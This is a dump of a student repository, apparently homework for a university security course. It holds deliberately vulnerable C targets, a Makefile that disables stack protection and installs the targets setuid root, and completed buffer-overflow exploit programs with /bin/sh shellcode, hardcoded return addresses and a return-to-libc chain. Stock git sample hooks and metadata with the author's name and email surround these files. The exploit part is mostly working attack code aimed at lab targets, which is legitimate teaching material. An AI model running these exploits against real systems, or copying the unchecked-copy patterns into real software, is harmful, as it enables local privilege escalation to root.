newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero="0000000000000000000000000000000000000000"
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0

<END OF ./.git/hooks/update.sample>
<START OF ./.git/refs/heads/main>
cb508fcc3161dd36de158d7f2fdc6934da4be6c5

<END OF ./.git/refs/heads/main>
<START OF ./.git/refs/remotes/origin/master>
5eef708ef223be75f74e68d36cedffcf5484f284

<END OF ./.git/refs/remotes/origin/master>
<START OF ./.git/refs/remotes/origin/main>
cb508fcc3161dd36de158d7f2fdc6934da4be6c5

<END OF ./.git/refs/remotes/origin/main>

<END OF ./repo.txt>
<START OF ./getCode.py>
import os

def append_file_contents_to_repo(start_dir, repo_file_path):
    """
    Recursively append the contents of all files in start_dir and its subdirectories
    to a single file specified by repo_file_path.
    """
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    contents = f.read()
                with open(repo_file_path, 'a', encoding='utf-8') as repo:
                    repo.write(f"<START OF {file_path}>\n")
                    repo.write(contents)
                    repo.write(f"\n<END OF {file_path}>\n")
            except Exception as e:
                print(f"Failed to process {file_path}: {e}")

if __name__ == "__main__":
    repo_file = "repo.txt"
    start_directory = "."  # Current directory
    append_file_contents_to_repo(start_directory, repo_file)

<END OF ./getCode.py>
<START OF ./cs5435-hw4/README.txt>
CS5435 HW4

Included are two directories:

demo/
This contains the demo target meet.c. 

sploits/
This contains the starter code for your exploits. 

targets/
This contains the targets. You can build the targets by running "sudo make" in targets/. 
The resulting executables will be placed in /tmp/ with appropriate
permissions.



<END OF ./cs5435-hw4/README.txt>
<START OF ./cs5435-hw4/demo/get_sp.c>
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%x\n", get_sp() );
}


<END OF ./cs5435-hw4/demo/get_sp.c>
<START OF ./cs5435-hw4/demo/meet.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/demo/meet.c>
<START OF ./cs5435-hw4/demo/simpleargs.c>
#include <stdio.h>
#include <string.h>


greeting( int v1 )
{
	char name[400];
}


int main(int argc, char* argv[] ) 
{
	int p1;
	greeting( p1 );
}

<END OF ./cs5435-hw4/demo/simpleargs.c>
<START OF ./cs5435-hw4/sploits/sploit1.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[2];  

  char buf[32];
  memset(buf, 0x90, 32);
  strncpy(buf+10, shellcode, 22);
  
  uint32_t ret = 0xffffcfdc;

  env[0] = buf;  
  env[1] = NULL;

  args[0] = TARGET;
  args[1] = (char*)&ret;
  args[2] = NULL;
  
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit1.c>
<START OF ./cs5435-hw4/sploits/sploitEC.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploitEC.c>
<START OF ./cs5435-hw4/sploits/sploit2.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1]; 

  char buf[500];
  memset(buf, 0x90, 500);
  memcpy(buf+400, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 488);
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = "400";
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit2.c>
<START OF ./cs5435-hw4/sploits/sploit3.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[256];
  int32_t *intvec = (int32_t*)buf;

  memset(buf, 0x90, 256);
  memcpy(buf+32, shellcode, sizeof(shellcode)); 

  intvec[16] = 0xffffcf88;
  intvec[17] = 0xffffcf88;
  intvec[18] = 0xffffcf88;
  intvec[19] = 0xffffcf88;
  intvec[20] = 0xffffcf88;

  args[0] = TARGET;
  args[1] = buf; 
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit3.c>
<START OF ./cs5435-hw4/sploits/shellcode.h>
static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

<END OF ./cs5435-hw4/sploits/shellcode.h>
<START OF ./cs5435-hw4/sploits/brute_force.py>

<END OF ./cs5435-hw4/sploits/brute_force.py>
<START OF ./cs5435-hw4/sploits/sploit0.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

int main(void)
{
    char *args[3];
    char *env[1];

    char buf[424];
    memset(buf, 0x90, 424);
    memcpy(buf + 212, shellcode, sizeof(shellcode));

    uint32_t *addr_ptr = (uint32_t*)(buf + 412);
    *addr_ptr++ = 0xffffcf50;
    *addr_ptr++ = 0xffffcf50;
    *addr_ptr++ = 0xffffcf50;

    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit4.c>
<START OF ./cs5435-hw4/targets/target2.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void greeting( char* temp1, short input_size )
{
  char name[400];

  if( input_size != 399 ) 
  {
    fprintf(stderr, "Error: input_size not 399\n" );
    return;
  }
  strcpy(name, temp1);
  printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
  int real_size = 0;
  int input_size = 0;

  if(argc != 3 )
  {
    fprintf(stderr, "meet: argc != 3\n");
    exit(EXIT_FAILURE);
  }

  real_size = strlen(argv[1]);
  input_size = atoi(argv[2]);
  if( real_size > input_size ) 
  {
    fprintf(stderr, "Error: real_size larger than input_size\n" );
    exit(EXIT_FAILURE);
  }

  greeting( argv[1], input_size );
  printf( "Bye %s\n", argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target2.c>
<START OF ./cs5435-hw4/targets/Makefile>
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pie -m32

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile>
<START OF ./cs5435-hw4/targets/target1.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strncpy(name, temp, 12);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target1.c>
<START OF ./cs5435-hw4/targets/Makefile-arm>
CC := arm-linux-gnueabi-gcc 
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -zexecstack -fno-stack-protector -no-pie -fno-pie
CFLAGSNOEXEC := -fno-stack-protector -no-pie -fno-pie

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile-arm>
<START OF ./cs5435-hw4/targets/target4.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strcpy(name, temp);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target4.c>
<START OF ./cs5435-hw4/targets/target0.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/targets/target0.c>
<START OF ./cs5435-hw4/targets/target3.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void copyFourInts( char *values )
{  
  int intvalues[4];
  memcpy((char*)intvalues, values, sizeof(int)*5);
}

void foo( char* values )
{
  copyFourInts( values );
}

int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }
  
  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target3.c>
<START OF ./.git/config>
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
	url = https://github.com/justinhalford/h4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
[branch "master"]
	remote = origin
	merge = refs/heads/master

<END OF ./.git/config>
<START OF ./.git/HEAD>
ref: refs/heads/master

<END OF ./.git/HEAD>
<START OF ./.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./.git/description>
<START OF ./.git/COMMIT_EDITMSG>
may 2 v2

<END OF ./.git/COMMIT_EDITMSG>
<START OF ./.git/info/exclude>
# git ls-files --others --exclude-from=.git/info/exclude
# Lines that start with '#' are comments.
# For a project mostly in C, the following would be a good set of
# exclude patterns (uncomment them if you want to use them):
# *.[oa]
# *~

<END OF ./.git/info/exclude>
<START OF ./.git/logs/HEAD>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 0000000000000000000000000000000000000000 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700344 -0400	commit: may 2
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701273 -0400	commit: may 2 v1
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701527 -0400	checkout: moving from main to master
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701929 -0400	commit: may 2 v2

<END OF ./.git/logs/HEAD>
<START OF ./.git/logs/refs/heads/master>
0000000000000000000000000000000000000000 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701527 -0400	branch: Created from HEAD
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701929 -0400	commit: may 2 v2

<END OF ./.git/logs/refs/heads/master>
<START OF ./.git/logs/refs/heads/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700344 -0400	commit: may 2
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701273 -0400	commit: may 2 v1

<END OF ./.git/logs/refs/heads/main>
<START OF ./.git/logs/refs/remotes/origin/master>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899467 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701559 -0400	update by push
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 4861122ff0358bef3a46545443aa5146e2400256 justinhalford <justinhalford@gmail.com> 1714701936 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/master>
<START OF ./.git/logs/refs/remotes/origin/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899483 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902050 -0400	update by push
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753703 -0400	update by push
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700350 -0400	update by push
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701281 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/main>
<START OF ./.git/hooks/commit-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}

<END OF ./.git/hooks/commit-msg.sample>
<START OF ./.git/hooks/pre-rebase.sample>
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END

<END OF ./.git/hooks/pre-rebase.sample>
<START OF ./.git/hooks/pre-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --

<END OF ./.git/hooks/pre-commit.sample>
<START OF ./.git/hooks/applypatch-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:

<END OF ./.git/hooks/applypatch-msg.sample>
<START OF ./.git/hooks/fsmonitor-watchman.sample>
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
# 'git config core.fsmonitor .git/hooks/query-watchman'
#
my ($version, $last_update_token) = @ARGV;

# Uncomment for debugging
# print STDERR "$0 $version $last_update_token\n";

# Check the hook interface version
if ($version ne 2) {
	die "Unsupported query-fsmonitor hook version '$version'.\n" .
	    "Falling back to scanning...\n";
}

my $git_work_tree = get_working_dir();

my $retry = 1;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

launch_watchman();

sub launch_watchman {
	my $o = watchman_query();
	if (is_work_tree_watched($o)) {
		output_result($o->{clock}, @{$o->{files}});
	}
}

sub output_result {
	my ($clockid, @files) = @_;

	# Uncomment for debugging watchman output
	# open (my $fh, ">", ".git/watchman-output.out");
	# binmode $fh, ":utf8";
	# print $fh "$clockid\n@files\n";
	# close $fh;

	binmode STDOUT, ":utf8";
	print $clockid;
	print "\0";
	local $, = "\0";
	print @files;
}

sub watchman_clock {
	my $response = qx/watchman clock "$git_work_tree"/;
	die "Failed to get clock id on '$git_work_tree'.\n" .
		"Falling back to scanning...\n" if $? != 0;

	return $json_pkg->new->utf8->decode($response);
}

sub watchman_query {
	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
	or die "open2() failed: $!\n" .
	"Falling back to scanning...\n";

	# In the query expression below we're asking for names of files that
	# changed since $last_update_token but not from the .git folder.
	#
	# To accomplish this, we're using the "since" generator to use the
	# recency index to select candidate nodes and "fields" to limit the
	# output to file names only. Then we're using the "expression" term to
	# further constrain the results.
	if (substr($last_update_token, 0, 1) eq "c") {
		$last_update_token = "\"$last_update_token\"";
	}
	my $query = <<"	END";
		["query", "$git_work_tree", {
			"since": $last_update_token,
			"fields": ["name"],
			"expression": ["not", ["dirname", ".git"]]
		}]
	END

	# Uncomment for debugging the watchman query
	# open (my $fh, ">", ".git/watchman-query.json");
	# print $fh $query;
	# close $fh;

	print CHLD_IN $query;
	close CHLD_IN;
	my $response = do {local $/; <CHLD_OUT>};

	# Uncomment for debugging the watch response
	# open ($fh, ">", ".git/watchman-response.json");
	# print $fh $response;
	# close $fh;

	die "Watchman: command returned no output.\n" .
	"Falling back to scanning...\n" if $response eq "";
	die "Watchman: command returned invalid output: $response\n" .
	"Falling back to scanning...\n" unless $response =~ /^\{/;

	return $json_pkg->new->utf8->decode($response);
}

